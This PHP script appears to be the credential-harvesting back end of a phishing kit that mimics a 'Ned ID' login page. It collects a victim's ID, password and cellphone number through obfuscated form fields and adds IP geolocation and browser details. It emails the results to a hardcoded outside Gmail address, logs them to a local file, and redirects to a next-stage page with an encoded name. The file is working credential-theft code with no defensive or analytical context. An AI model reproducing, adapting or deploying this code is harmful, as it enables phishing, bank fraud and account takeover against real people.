<?php

$name = $_POST['rr0298938029'];
$message = $_POST['triuew3887d7829'];
$message1 = $_POST['rr0298938333'];
require_once('./geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];



$email_body = "========NED ID=START==================== \n";
$email_body .= "Ned ID: $name \n";
$email_body .= "Password: $message \n";
$email_body .= "Cellphone: $message1 \n";
$email_body .= 	"IP: {$geoplugin->ip}  \n";
$email_body .= 	"City: {$geoplugin->city}  \n";
$email_body .= 	"Region: {$geoplugin->region}  \n";
$email_body .= 	"Country Name: {$geoplugin->countryName}  \n";
$email_body .= 	"Country Code: {$geoplugin->countryCode}  \n";
$email_body .= 	"User-Agent: ".$browser."  \n";
$email_body .= "Date Log  : ".$date."  \n";
$email_body .= "Time Log  : ".$time." \n";
$email_body .= "========END============================ \n";
 
$email_from = "Ned 1st <support@".$_SERVER['HTTP_HOST'].">";
$email_subject = "[$geoplugin->ip] [$name] 1st Result Ned OTP EN";
 
$to = "ogidijonas@gmail.com";//<== update the email address
$headers = "From: $email_from \r\n";
//Send the email!
mail($to,$email_subject,$email_body,$headers);


//done. redirect to thank-you page.

header("Location: ZHRoPSI0MHB4IiBoZWlnaHQ9IjQwcHgiIHZpZXdCb3g9IjAgMCA1M_ver7.php?rr0298938029=$name");

$fp = fopen("backup.txt","a");
fputs($fp,$email_body);
fclose($fp);


   
?> 